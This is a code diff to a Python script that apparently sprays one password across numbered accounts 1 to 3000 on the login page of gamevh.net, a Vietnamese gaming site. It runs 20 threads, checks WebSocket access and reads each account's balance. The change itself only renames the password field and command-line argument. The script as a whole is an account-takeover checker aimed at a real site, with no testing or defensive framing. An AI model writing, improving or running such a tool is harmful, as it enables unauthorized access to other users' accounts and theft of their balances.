@@ -94,7 +94,7 @@ def http_check(user, pwd, with_balance=True):
         s.headers.update({"User-Agent": UA, "Accept-Language": "vi-VN,vi;q=0.9"})
         s.get(LOGIN_URL, timeout=12)
         r = s.post(LOGIN_URL, timeout=12,
-                   data={"redirect": "/", "USER_NAME": user, "PWD": pwd,
+                   data={"redirect": "/", "USER_NAME": user, "PASSWORD": pwd,
                          "AUTO_LOGIN": "true", "LOGIN": "Đăng nhập"},
                    headers={"Origin": "https://gamevh.net", "Referer": LOGIN_URL},
                    allow_redirects=True)
@@ -200,7 +200,7 @@ def main():
     ap.add_argument("--start", type=int, default=1)
     ap.add_argument("--end", type=int, default=3000)
     ap.add_argument("--exclude", default="", help="số cần loại, vd: 1,25")
-    ap.add_argument("--pwd", default="")
+    ap.add_argument("--password", "--pwd", default="")
     ap.add_argument("--workers", type=int, default=20)
     ap.add_argument("--no-ws", action="store_true", help="chỉ check HTTP, không check WebSocket")
     ap.add_argument("--fast", action="store_true", help="không đọc số dư (nhanh hơn)")
@@ -228,7 +228,7 @@ def main():
 
     results = []
     with ThreadPoolExecutor(max_workers=args.workers) as ex:
-        futs = [ex.submit(scan_one, u, args.pwd, not args.no_ws,
+        futs = [ex.submit(scan_one, u, args.password, not args.no_ws,
                           not args.fast, args.remain) for u in users]
         for f in as_completed(futs):
             r = f.result()
